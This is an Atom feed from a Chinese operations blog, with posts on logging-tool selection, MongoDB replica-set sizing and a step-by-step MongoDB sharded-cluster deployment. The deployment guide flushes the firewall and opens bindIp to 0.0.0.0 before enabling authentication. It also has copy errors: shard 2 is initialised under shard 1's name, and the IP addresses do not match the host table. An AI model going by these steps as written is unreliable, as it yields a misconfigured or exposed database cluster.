<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>运维人</title>
  
  
  <link href="https://www.langxw.com/atom.xml" rel="self"/>
  
  <link href="https://www.langxw.com/"/>
  <updated>2021-04-13T11:42:17.930Z</updated>
  <id>https://www.langxw.com/</id>
  
  <author>
    <name>运维人</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志系统的选型</title>
    <link href="https://www.langxw.com/2021/04/13/%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%80%89%E5%9E%8B/"/>
    <id>https://www.langxw.com/2021/04/13/%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%80%89%E5%9E%8B/</id>
    <published>2021-04-13T11:36:34.000Z</published>
    <updated>2021-04-13T11:42:17.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、需求"><a href="#一、需求" class="headerlink" title="一、需求"></a>一、需求</h2><p>简单、安全、轻量级、不耗费资源、最好能时时查看日志（需求不大）。</p><h2 id="二、选型"><a href="#二、选型" class="headerlink" title="二、选型"></a>二、选型</h2><table><thead><tr><th>方法</th><th>工具</th></tr></thead><tbody><tr><td>日志系统</td><td>Rsyslog，Fluented，ELK，Loki、Logio、SLS</td></tr><tr><td>定时同步</td><td>Scp、Rsync</td></tr><tr><td>文件共享</td><td>SFTP、VSFTP、NFS共享、NAS</td></tr><tr><td>可视化</td><td>Jenkins + Ansible + Shell Or Python Web</td></tr></tbody></table><h2 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h2><h3 id="1、日志系统"><a href="#1、日志系统" class="headerlink" title="1、日志系统"></a>1、日志系统</h3><ol><li>如果是中大型系统，不缺资源，不缺经费，那么就可以采用开源的日志系统或者采用阿里云SLS日志系统。</li><li>可以根据日志规模，应用规模来进行选型，简单的就用Rsyslog、Logio，复杂的就用Fluented、ELK、LoKi。</li><li>如果使用的是云主机而且不差钱，可以使用阿里云日志系统SLS，还是很好用的，功能也很强大。</li></ol><h3 id="2、定时同步"><a href="#2、定时同步" class="headerlink" title="2、定时同步"></a>2、定时同步</h3><ol><li>如果对实时性要求不高，我们可以Scp或者Rsync脚本定时远程同步，问题就在于间隔时间的确定和来自不同机器的名字相同的文件的区分。</li><li>可以在每台日志服务器上搭建rysncd服务端，进行推送，但是如果日志分散的话，需要安装多个服务端，不建议。</li></ol><h3 id="3、文件共享"><a href="#3、文件共享" class="headerlink" title="3、文件共享"></a>3、文件共享</h3><ol><li>可以使用NFS或者NAS，将一块磁盘挂载到所有机器上，然后使用软连接来访问不同的日志。</li><li>还可以使用基于SSH服务端的SFTP服务，进行权限控制后，将日志目录挂载到用户目录进行日志的下载。</li></ol><h3 id="4、可视化"><a href="#4、可视化" class="headerlink" title="4、可视化"></a>4、可视化</h3><p>可视化web界面可以使用Jenkins + Ansible + Shell来实现，也可以自己写Python网页来实现，具体实现有待研究。</p><h2 id="四、结论"><a href="#四、结论" class="headerlink" title="四、结论"></a>四、结论</h2><p>作为一个初创公司的小型系统，由于资源缺乏，日志查询需求不是频繁，也不太需要查看实时日志，故采用**SFTP + mount **的形式来满足开发查询日志的需求。不额外安装软件，不占用系统资源，配置简单，就很Nice。</p><h2 id="五、注意"><a href="#五、注意" class="headerlink" title="五、注意"></a>五、注意</h2><ol><li>硬链接不能跨分区，硬连接不能链接目录，只能链接文件。</li><li>FTP不支持软连接。</li><li>Mount可以挂载本机的文件目录。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、需求&quot;&gt;&lt;a href=&quot;#一、需求&quot; class=&quot;headerlink&quot; title=&quot;一、需求&quot;&gt;&lt;/a&gt;一、需求&lt;/h2&gt;&lt;p&gt;简单、安全、轻量级、不耗费资源、最好能时时查看日志（需求不大）。&lt;/p&gt;
&lt;h2 id=&quot;二、选型&quot;&gt;&lt;a href=&quot;#二</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="FTP" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/FTP/"/>
    
    
    <category term="FTP" scheme="https://www.langxw.com/tags/FTP/"/>
    
    <category term="日志系统" scheme="https://www.langxw.com/tags/%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Mongodb复制集建议奇数个节点的原因</title>
    <link href="https://www.langxw.com/2021/03/12/Mongodb%E5%A4%8D%E5%88%B6%E9%9B%86%E5%BB%BA%E8%AE%AE%E5%A5%87%E6%95%B0%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E5%8E%9F%E5%9B%A0/"/>
    <id>https://www.langxw.com/2021/03/12/Mongodb%E5%A4%8D%E5%88%B6%E9%9B%86%E5%BB%BA%E8%AE%AE%E5%A5%87%E6%95%B0%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E5%8E%9F%E5%9B%A0/</id>
    <published>2021-03-12T14:58:06.000Z</published>
    <updated>2021-03-16T12:21:15.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、官方建议"><a href="#一、官方建议" class="headerlink" title="一、官方建议"></a>一、官方建议</h2><p><strong>奇数个就不用带仲裁节点了，偶数个要带一个仲裁节点。</strong></p><h2 id="二、原因分析"><a href="#二、原因分析" class="headerlink" title="二、原因分析"></a>二、原因分析</h2><ol><li><p>防止网络阻隔；防止脑列，导致选举失败。两个IDC机房网络中断，或者两个机柜网络中断。</p></li><li><p>存活数（参与选举数）大与50%，集群才能正常工作的原则，说明了偶数个节点基本就是浪费资源（除了多个一个可读的副本）</p></li></ol><h2 id="三、三节点复制集带仲裁节点与不带的优劣"><a href="#三、三节点复制集带仲裁节点与不带的优劣" class="headerlink" title="三、三节点复制集带仲裁节点与不带的优劣"></a>三、三节点复制集带仲裁节点与不带的优劣</h2><ul><li>带仲裁节点，仲裁节点占用资源小，可节省资源。</li><li>不带，多一个可读副本集，分散读的压力。多一个数据备份。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、官方建议&quot;&gt;&lt;a href=&quot;#一、官方建议&quot; class=&quot;headerlink&quot; title=&quot;一、官方建议&quot;&gt;&lt;/a&gt;一、官方建议&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;奇数个就不用带仲裁节点了，偶数个要带一个仲裁节点。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="数据库" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="MongoDB" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/"/>
    
    
    <category term="mongodb" scheme="https://www.langxw.com/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>Mongodb分片集群部署</title>
    <link href="https://www.langxw.com/2021/03/12/Mongodb%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"/>
    <id>https://www.langxw.com/2021/03/12/Mongodb%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</id>
    <published>2021-03-12T12:52:20.000Z</published>
    <updated>2021-03-16T11:56:59.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、架构"><a href="#一、架构" class="headerlink" title="一、架构"></a>一、架构</h2><h3 id="1、Mongodb分片集群配置"><a href="#1、Mongodb分片集群配置" class="headerlink" title="1、Mongodb分片集群配置"></a>1、Mongodb分片集群配置</h3><p>按照尽量节省资源的原则，不交叉部署的原则：</p><table><thead><tr><th>作用</th><th>配置</th><th>数量</th></tr></thead><tbody><tr><td>分片1-主、分片1-副</td><td>8C16G300GSSD</td><td>2</td></tr><tr><td>分片1-仲裁节点</td><td>4C8G100GSSD</td><td>1</td></tr><tr><td>分片2-主、分片2-副</td><td>8C16G300GSSD</td><td>2</td></tr><tr><td>分片2-仲裁节点</td><td>4C8G100GSSD</td><td>1</td></tr><tr><td>config服务复制集（1主2副）</td><td>4C8G100GSSD</td><td>3</td></tr><tr><td>mongos路由</td><td>2C4G40GSSD</td><td>3</td></tr></tbody></table><h3 id="2、说明"><a href="#2、说明" class="headerlink" title="2、说明"></a>2、说明</h3><p>MongoDB分片集群，英文名称为： Sharded Cluster。旨在通过横向扩展，来提高数据吞吐性能、增大数据存储量。</p><p>分片集群由三个组件：“mongos”, “config server”, “shard” 组成。<br><img src="https://img-blog.csdnimg.cn/20190416151746484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5iZWliZWk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>mongos:数据库请求路由。负责接收所有客户端应用程序的连接查询请求，并将请求路由到集群内部对应的分片上。”mongos”可以有1个或多个。</p><p>本身不保存数据，在启动时从配置服务器加载集群信息，开启mongos进程需要知道配置服务器的地址，指定configdb选项。</p></li><li><p>config server: 配置服务器。是一个独立的mongod进程，保存集群和分片的元数据，即各分片包含了哪些数据的信息。最先开始建立，启用日志功能。像启动普通的mongod一样启动配置服务器，指定configsvr选项。不需要太多的空间和资源，配置服务器的1KB空间相当于真是数据的200MB。保存的只是数据的分布表。当服务不可用，则变成只读，无法分块、迁移数据。</p></li><li><p>shard: 分片存储。将数据分片存储在多个服务器上。有点类似关系数据库”分区表”的概念，只不过分区表是将数据分散存储在多个文件中，而sharding将数据分散存储在多个服务器上。一个集群可以有一个或多个分片。</p></li><li><p>每个分片都必须是副本集，“config server” 必须是副本集！</p></li></ul><h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><ul><li><p>操作系统：Centos6.5</p></li><li><p>Mongodb版本：3.2.1 RPM包</p><pre><code class="bash">mongodb-org-server-3.2.1-1.el7.x86_64.rpmmongodb-org-tools-3.2.1-1.el7.x86_64.rpmmongodb-org-mongos-3.2.1-1.el7.x86_64.rpmmongodb-org-shell-3.2.1-1.el7.x86_64.rpmmongodb-org-3.2.1-1.el7.x86_64.rpm</code></pre></li><li><p>主机规划：mongos（3个）+ config server 副本集（1主2从） + 分片（2个，每个分片由1主1从1仲裁组成），一共12台主机：</p><table><thead><tr><th>主机编号</th><th>IP地址</th><th>角色</th></tr></thead><tbody><tr><td>1</td><td>192.168.1.1</td><td>Mongos-1</td></tr><tr><td>2</td><td>192.168.1.2</td><td>Mongos-2</td></tr><tr><td>3</td><td>192.168.1.3</td><td>Mongos-3</td></tr><tr><td>4</td><td>192.168.1.11</td><td>Config-1</td></tr><tr><td>5</td><td>192.168.1.12</td><td>Config-2</td></tr><tr><td>6</td><td>192.168.1.13</td><td>Config-3</td></tr><tr><td>7</td><td>192.168.1.21</td><td>Shard1-Primary</td></tr><tr><td>8</td><td>192.168.1.22</td><td>Shard1-Secondary</td></tr><tr><td>9</td><td>192.168.1.23</td><td>Shard1-Arbiter</td></tr><tr><td>10</td><td>192.168.1.31</td><td>Shard2-Primary</td></tr><tr><td>11</td><td>192.168.1.32</td><td>Shard2-Secondary</td></tr><tr><td>12</td><td>192.168.1.33</td><td>Shard2-Arbiter</td></tr></tbody></table></li></ul><h2 id="三、分片集群搭建"><a href="#三、分片集群搭建" class="headerlink" title="三、分片集群搭建"></a>三、分片集群搭建</h2><h3 id="1、搭建步骤"><a href="#1、搭建步骤" class="headerlink" title="1、搭建步骤"></a>1、搭建步骤</h3><p>分片集群各组件搭建顺序如下，不能错：</p><ol><li>ConfigServer –&gt; 2.Shard集群 –&gt; 3.Mongos</li></ol><p><strong>启动顺序也是这样</strong></p><h3 id="2、所有主机预备操作"><a href="#2、所有主机预备操作" class="headerlink" title="2、所有主机预备操作"></a>2、所有主机预备操作</h3><h4 id="2-1、修改Linux主机能创建的文件数量限制"><a href="#2-1、修改Linux主机能创建的文件数量限制" class="headerlink" title="2.1、修改Linux主机能创建的文件数量限制"></a>2.1、修改Linux主机能创建的文件数量限制</h4><pre><code class="bash">echo &quot;ulimit -c unlimited&quot; &gt;&gt; /etc/profile &amp;&amp; source /etc/profilecat &gt;&gt; /etc/security/limits.conf &lt;&lt; EOF* soft nofile 262140* hard nofile 262140root soft nofile 262140root hard nofile 262140* soft core unlimited* hard core unlimitedroot soft core unlimitedroot hard core unlimitedEOFecho &quot;session  required  pam_limits.so&quot;&gt;&gt; /etc/pam.d/login</code></pre><h4 id="2-2、使用RPM包安装mongodb"><a href="#2-2、使用RPM包安装mongodb" class="headerlink" title="2.2、使用RPM包安装mongodb"></a>2.2、使用RPM包安装mongodb</h4><pre><code class="bash">rpm -ivh mongodb-org-server-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-tools-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-mongos-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-shell-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-3.2.1-1.el7.x86_64.rpm</code></pre><h4 id="2-3、修改监听IP"><a href="#2-3、修改监听IP" class="headerlink" title="2.3、修改监听IP"></a>2.3、修改监听IP</h4><pre><code class="bash">sed -i &quot;s/bindIp: 127.0.0.1/bindIp: 0.0.0.0/g&quot; /etc/mongod.conf</code></pre><h4 id="2-4、清空防火墙"><a href="#2-4、清空防火墙" class="headerlink" title="2.4、清空防火墙"></a>2.4、清空防火墙</h4><pre><code class="bash">iptables -Fsystemctl stop firewalldsystemctl disable firewalld</code></pre><p><strong>或者，在防火墙添加相应的放通策略，也可以</strong></p><h3 id="3、搭建Config-Server集群"><a href="#3、搭建Config-Server集群" class="headerlink" title="3、搭建Config-Server集群"></a>3、搭建Config-Server集群</h3><p>ConfigServer是一个副本集集群，一主两从，按照搭建副本集的方式搭建即可。</p><h4 id="3-1、修改Congfig-Server配置文件"><a href="#3-1、修改Congfig-Server配置文件" class="headerlink" title="3.1、修改Congfig-Server配置文件"></a>3.1、修改Congfig-Server配置文件</h4><p>三台主机配置相同，依次执行如下命令：</p><pre><code class="bash">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFreplication:  oplogSizeMB: 2048  replSetName: mars-configsharding:  clusterRole: configsvrEOF</code></pre><p><strong>注意：集群角色必须是configsvr</strong></p><h4 id="3-2、启动Mongod"><a href="#3-2、启动Mongod" class="headerlink" title="3.2、启动Mongod"></a>3.2、启动Mongod</h4><p>三台主机依次启动mongod程序</p><pre><code class="bash">systemctl start mongod   </code></pre><h4 id="3-3、初始化config-server副本集"><a href="#3-3、初始化config-server副本集" class="headerlink" title="3.3、初始化config-server副本集"></a>3.3、初始化config-server副本集</h4><p>三台主机随便挑一台，敲<code>mongo</code>进入mongo shell，执行如下命令：</p><pre><code class="bash">rs.initiate( &#123;    _id: &quot;mars-config&quot;,    configsvr: true,    members: [        &#123; _id: 0, host: &quot;192.168.0.11:27017&quot;&#125;,        &#123; _id: 1, host: &quot;192.168.0.12:27017&quot;&#125;,        &#123; _id: 2, host: &quot;192.168.0.13:27017&quot;&#125;    ]&#125; )</code></pre><p><strong>注意：id为集群名称，configsvr为true。</strong></p><h4 id="3-4-验证"><a href="#3-4-验证" class="headerlink" title="3.4 验证"></a>3.4 验证</h4><pre><code class="bash">rs.status()</code></pre><h3 id="3、搭建Shard分片复制集集群"><a href="#3、搭建Shard分片复制集集群" class="headerlink" title="3、搭建Shard分片复制集集群"></a>3、搭建Shard分片复制集集群</h3><p>此处我们采用2个Shard分片，每个分片是一个主-从-仲裁的三节点复制集。两个分片配置过程一致。</p><h4 id="3-1、分片1"><a href="#3-1、分片1" class="headerlink" title="3.1、分片1"></a>3.1、分片1</h4><h5 id="3-1-1、修改配置文件"><a href="#3-1-1、修改配置文件" class="headerlink" title="3.1.1、修改配置文件"></a>3.1.1、修改配置文件</h5><p>三台主机配置相同，依次执行如下shell命令：</p><pre><code class="bash">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFreplication:  oplogSizeMB: 2048  replSetName: mars-shard1sharding:  clusterRole: shardsvrEOF</code></pre><p><strong>注意：集群名字为shard1，要和分片2区分开。集群角色为shardsvr。</strong></p><h5 id="3-1-2、启动mongod"><a href="#3-1-2、启动mongod" class="headerlink" title="3.1.2、启动mongod"></a>3.1.2、启动mongod</h5><pre><code class="shell">systemctl start mongod</code></pre><h5 id="3-1-3、初始化Shard1副本集"><a href="#3-1-3、初始化Shard1副本集" class="headerlink" title="3.1.3、初始化Shard1副本集"></a>3.1.3、初始化Shard1副本集</h5><p>三台主机随便挑一台，敲<code>mongo</code>进入mongo shell，执行如下命令：</p><pre><code class="shell">rs.initiate( &#123;    _id: &quot;mars-shard1&quot;,    members: [        &#123; _id: 0, host: &quot;192.168.0.21:27017&quot;&#125;,        &#123; _id: 1, host: &quot;192.168.0.22:27017&quot;&#125;,        &#123; _id: 2, host: &quot;192.168.0.23:27017&quot;, arbiterOnly: true&#125;    ]&#125; )</code></pre><p><strong>注意：id为配置文件中的集群名称。</strong></p><h5 id="3-1-4、验证"><a href="#3-1-4、验证" class="headerlink" title="3.1.4、验证"></a>3.1.4、验证</h5><pre><code class="shell">rs.status()</code></pre><h4 id="3-2、分片2"><a href="#3-2、分片2" class="headerlink" title="3.2、分片2"></a>3.2、分片2</h4><h5 id="3-2-1、修改配置文件"><a href="#3-2-1、修改配置文件" class="headerlink" title="3.2.1、修改配置文件"></a>3.2.1、修改配置文件</h5><p>三台主机配置相同，依次执行如下shell命令：</p><pre><code class="bash">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFreplication:  oplogSizeMB: 2048  replSetName: mars-shard2sharding:  clusterRole: shardsvrEOF</code></pre><p><strong>注意：集群名字为shard2，要和分片1区分开。集群角色为shardsvr。</strong></p><h5 id="3-2-2、启动mongod"><a href="#3-2-2、启动mongod" class="headerlink" title="3.2.2、启动mongod"></a>3.2.2、启动mongod</h5><pre><code class="shell">systemctl start mongod</code></pre><h5 id="3-2-3、初始化Shard1副本集"><a href="#3-2-3、初始化Shard1副本集" class="headerlink" title="3.2.3、初始化Shard1副本集"></a>3.2.3、初始化Shard1副本集</h5><p>三台主机随便挑一台，敲<code>mongo</code>进入mongo shell，执行如下命令：</p><pre><code class="shell">rs.initiate( &#123;    _id: &quot;mars-shard1&quot;,    members: [        &#123; _id: 0, host: &quot;192.168.0.31:27017&quot;&#125;,        &#123; _id: 1, host: &quot;192.168.0.32:27017&quot;&#125;,        &#123; _id: 2, host: &quot;192.168.0.33:27017&quot;, arbiterOnly: true&#125;    ]&#125; )</code></pre><p><strong>注意：id为配置文件中的集群名称。</strong></p><p><strong>我这里把第三台主机设为仲裁主机，是为了节省硬件资源，节约成本。如果不在乎这点成本，可以去掉上面arbiterOnly的配置。</strong></p><h5 id="3-2-4、验证"><a href="#3-2-4、验证" class="headerlink" title="3.2.4、验证"></a>3.2.4、验证</h5><pre><code class="shell">rs.status()</code></pre><h3 id="4、搭建mongos路由"><a href="#4、搭建mongos路由" class="headerlink" title="4、搭建mongos路由"></a>4、搭建mongos路由</h3><p>mongos可以为1个，也可以为多个，可以根据需要横向扩展，这里采用3个。</p><h4 id="4-1、修改配置文件"><a href="#4-1、修改配置文件" class="headerlink" title="4.1、修改配置文件"></a>4.1、修改配置文件</h4><p>mongos的配置文件为mongos.conf，如果不存在就采用如下方式新建，三台主机依次执行：</p><pre><code class="bash">cat &gt;&gt; /etc/mongos.conf &lt;&lt; EOFsystemLog:  destination: file  logAppend: true  path: /var/log/mongodb/mongod.log# how the process runsprocessManagement:  fork: true  # fork and run in background  pidFilePath: /var/run/mongodb/mongos.pid  # location of pidfile# network interfacesnet:  port: 27017sharding:  configDB: mars-config/192.168.0.11:27017, 192.168.0.12:27017, 192.168.0.13:27017EOF</code></pre><p><strong>注意：configDB为config-server集群的IP和端口，不要填错。</strong></p><h4 id="4-2、启动mongos"><a href="#4-2、启动mongos" class="headerlink" title="4.2、启动mongos"></a>4.2、启动mongos</h4><p>已mongod用户启动mongos，三台主机依次执行：</p><pre><code class="bash">sudo -u mongod mongos -f /etc/mongos.conf</code></pre><h4 id="4-3、添加分片"><a href="#4-3、添加分片" class="headerlink" title="4.3、添加分片"></a>4.3、添加分片</h4><p>连接任意一个mongos，在任意一台主机上执行<code>mongo</code>，添加分片信息：</p><pre><code class="bash">use adminsh.addShard(&quot;mars-shard1/192.168.0.21:27017,192.168.0.22:27017,192.168.0.23:27017&quot;)sh.addShard(&quot;mars-shard2/192.168.0.31:27017,192.168.0.32:27017,192.168.0.33:27017&quot;)</code></pre><h4 id="4-4、验证"><a href="#4-4、验证" class="headerlink" title="4.4、验证"></a>4.4、验证</h4><pre><code class="bash">sh.status()</code></pre><p><img src="https://img-blog.csdnimg.cn/201904161718322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5iZWliZWk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>至此，一个基本的Shard分片集群已经搭建完毕。</strong></p><h3 id="5、使用分片"><a href="#5、使用分片" class="headerlink" title="5、使用分片"></a>5、使用分片</h3><p>使用分片的基本步骤是：1.开启数据库分片–&gt; 2.开启集合分片</p><p>对数据库分片是对集合分片的先决条件。</p><h4 id="5-1、开启数据库分片"><a href="#5-1、开启数据库分片" class="headerlink" title="5.1、开启数据库分片"></a>5.1、开启数据库分片</h4><p>以testdb数据库为例，在一台mongos上，进入mongoshell，执行：</p><pre><code class="shell">sh.enableSharding(&quot;testdb&quot;)</code></pre><h4 id="5-2、开始集合分片"><a href="#5-2、开始集合分片" class="headerlink" title="5.2、开始集合分片"></a>5.2、开始集合分片</h4><p>已testdb.coll1集合为例：</p><pre><code>sh.shardCollection(&quot;testdb.coll1&quot;, &#123;&quot;name&quot; : &quot;hashed&quot;&#125;)</code></pre><p>说明：</p><ul><li>第一个参数为集合的完整namespace名称，此例集合为testdb.coll1。</li><li>第二个参数为片键，指定根据哪个字段进行分片，此例对name字段进行hash分片。</li></ul><h4 id="5-3、插入数据验证分片"><a href="#5-3、插入数据验证分片" class="headerlink" title="5.3、插入数据验证分片"></a>5.3、插入数据验证分片</h4><p>插入测试数据</p><pre><code class="bash">use testdbfor (var i = 1; i &lt;= 100000; i++)&#123;  db.coll1.insert(&#123;&quot;id&quot; : i, &quot;name&quot; : &quot;name&quot; + i&#125;);&#125;</code></pre><p>验证是否分片</p><pre><code class="bash">sh.status()</code></pre><p><img src="https://img-blog.csdnimg.cn/20190416174828762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5iZWliZWk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="6、添加集群认证"><a href="#6、添加集群认证" class="headerlink" title="6、添加集群认证"></a>6、添加集群认证</h3><p>上文已经成功创建一个分片集群，并验证数据分片可用。但在部署生产环境时，还需添加认证，用以保障集群安全性。<br>认证分两种：</p><ul><li><p>集群内部认证 (Internal Authentication)<br>用于集群内的各个组件(mongos, config server, shard)之间相互访问认证，也就是所有的mongos进程和mongod进程之间相互访问认证。<br>内部认证通过keyfile密钥文件实现，即所有的monogs/mongod公用同一个keyfile文件来相互认证。如果集群外随便来一个”mongod”进程，如果没有相同的keyfile，想加入集群，是不可能的。</p></li><li><p>外部用户访问集群所需的用户认证 (User Access Controls)<br>用于外部客户端访问mongos时，所需的用户认证。</p></li></ul><h4 id="6-1、生成并分发密钥文件Keyfile"><a href="#6-1、生成并分发密钥文件Keyfile" class="headerlink" title="6.1、生成并分发密钥文件Keyfile"></a>6.1、生成并分发密钥文件Keyfile</h4><p>在第一台主机上执行</p><pre><code class="bash">openssl rand -base64 756 &gt; /var/lib/mongo/keyFilechmod 600 /var/lib/mongo/keyFilechown -R mongod:mongod /var/lib/mongo/keyFile</code></pre><p>其他所有主机复制第一台生成的keyFile文件(通过lszrz 或者 scp 或者 ftp)，并执行以下命令：</p><pre><code>cp keyFile /var/lib/mongo/chmod 600 /var/lib/mongo/keyFilechown -R mongod:mongod /var/lib/mongo/keyFile</code></pre><h4 id="6-2、添加用户"><a href="#6-2、添加用户" class="headerlink" title="6.2、添加用户"></a>6.2、添加用户</h4><p>连接到任意一台mongos上，添加超级管理员用户：</p><pre><code class="bash">use admindb.createUser(&#123;user: &quot;admin&quot;,pwd: &quot;xxx@1111&quot;,roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;,&#123; role: &quot;clusterAdmin&quot;, db: &quot;admin&quot; &#125;]&#125;)</code></pre><p>添加客户端用户：</p><pre><code class="bash">use test_dbdb.createUser(&#123;user: &quot;test_rw&quot;,pwd: &quot;xxx#111&quot;,roles: [&#123; role: &quot;dbOwner&quot;, db: &quot;test_db&quot;&#125;]&#125;)</code></pre><p>在”mongos”上添加用户，用户信息实际保存在”config server”上，”mongos”本身不存储任何数据，包括用户信息。</p><p>然而，”mongos”上创建的用户，是不会自动添加到”shard”分片服务器上的。<br>为了以后方便维护shard分片服务器，分别登录到每个分片服务器的”primary”节点，添加管理员用户：</p><pre><code class="bash">use admindb.createUser(&#123;user: &quot;admin&quot;,pwd: &quot;xxx@1111&quot;,roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;,&#123; role: &quot;clusterAdmin&quot;, db: &quot;admin&quot; &#125;]&#125;)</code></pre><h4 id="6-3、开启认证"><a href="#6-3、开启认证" class="headerlink" title="6.3、开启认证"></a>6.3、开启认证</h4><h5 id="6-3-1、为所有mongod程序添加认证参数"><a href="#6-3-1、为所有mongod程序添加认证参数" class="headerlink" title="6.3.1、为所有mongod程序添加认证参数"></a>6.3.1、为所有mongod程序添加认证参数</h5><p>所有mongod程序包括，config-server主机3台，分片集群6台。</p><pre><code class="bash">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFsecurity:  authorization: enabled  keyFile: /var/lib/mongo/keyFileEOF</code></pre><h5 id="6-3-2、为所有mongos程序添加认证参数"><a href="#6-3-2、为所有mongos程序添加认证参数" class="headerlink" title="6.3.2、为所有mongos程序添加认证参数"></a>6.3.2、为所有mongos程序添加认证参数</h5><p>在三台mongos主机上执行：</p><pre><code class="bash">cat &gt;&gt; /etc/mongos.conf &lt;&lt; EOFsecurity:  keyFile: /var/lib/mongo/keyFileEOF</code></pre><h5 id="6-3-3、停止集群内所有mongos和mongod程序"><a href="#6-3-3、停止集群内所有mongos和mongod程序" class="headerlink" title="6.3.3、停止集群内所有mongos和mongod程序"></a>6.3.3、停止集群内所有mongos和mongod程序</h5><p>mongos程序使用<code>kill -9 pid</code>停止，mongod程序使用<code>systemctl stop mongod</code>停止。</p><h5 id="6-3-4、按顺序启动所有程序"><a href="#6-3-4、按顺序启动所有程序" class="headerlink" title="6.3.4、按顺序启动所有程序"></a>6.3.4、按顺序启动所有程序</h5><ol><li>config-server -&gt; 2. shard集群 -&gt; 3. mongos</li></ol><h5 id="6-3-5、验证用户访问"><a href="#6-3-5、验证用户访问" class="headerlink" title="6.3.5、验证用户访问"></a>6.3.5、验证用户访问</h5><p>通过连接任意一个mongos，验证管理员用户和客户端用户的访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、架构&quot;&gt;&lt;a href=&quot;#一、架构&quot; class=&quot;headerlink&quot; title=&quot;一、架构&quot;&gt;&lt;/a&gt;一、架构&lt;/h2&gt;&lt;h3 id=&quot;1、Mongodb分片集群配置&quot;&gt;&lt;a href=&quot;#1、Mongodb分片集群配置&quot; class=&quot;header</summary>
      
    
    
    
    <category term="数据库" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="MongoDB" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/"/>
    
    
    <category term="mongodb" scheme="https://www.langxw.com/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>Mongodb复制集集群搭建</title>
    <link href="https://www.langxw.com/2021/03/03/Mongodb%E5%A4%8D%E5%88%B6%E9%9B%86%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>https://www.langxw.com/2021/03/03/Mongodb%E5%A4%8D%E5%88%B6%E9%9B%86%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</id>
    <published>2021-03-03T11:37:16.000Z</published>
    <updated>2021-03-16T12:12:07.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、环境说明"><a href="#一、环境说明" class="headerlink" title="一、环境说明"></a>一、环境说明</h2><ol><li><p>操作系统：Centos7.6</p></li><li><p>Mongodb 3.2.1 的rpm包</p><pre><code class="bash">mongodb-org-server-3.2.1-1.el7.x86_64.rpmmongodb-org-tools-3.2.1-1.el7.x86_64.rpmmongodb-org-mongos-3.2.1-1.el7.x86_64.rpmmongodb-org-shell-3.2.1-1.el7.x86_64.rpmmongodb-org-3.2.1-1.el7.x86_64.rpm</code></pre></li><li><p>集群模式：Replica Set，一个主节点两个从节点，没有仲裁节点</p><table><thead><tr><th>节点</th><th>IP</th></tr></thead><tbody><tr><td>primary</td><td>172.16.20.29</td></tr><tr><td>secondary</td><td>172.16.20.30</td></tr><tr><td>secondary</td><td>172.16.20.31</td></tr></tbody></table><h2 id="二、离线安装"><a href="#二、离线安装" class="headerlink" title="二、离线安装"></a>二、离线安装</h2><h3 id="1、关闭防火墙"><a href="#1、关闭防火墙" class="headerlink" 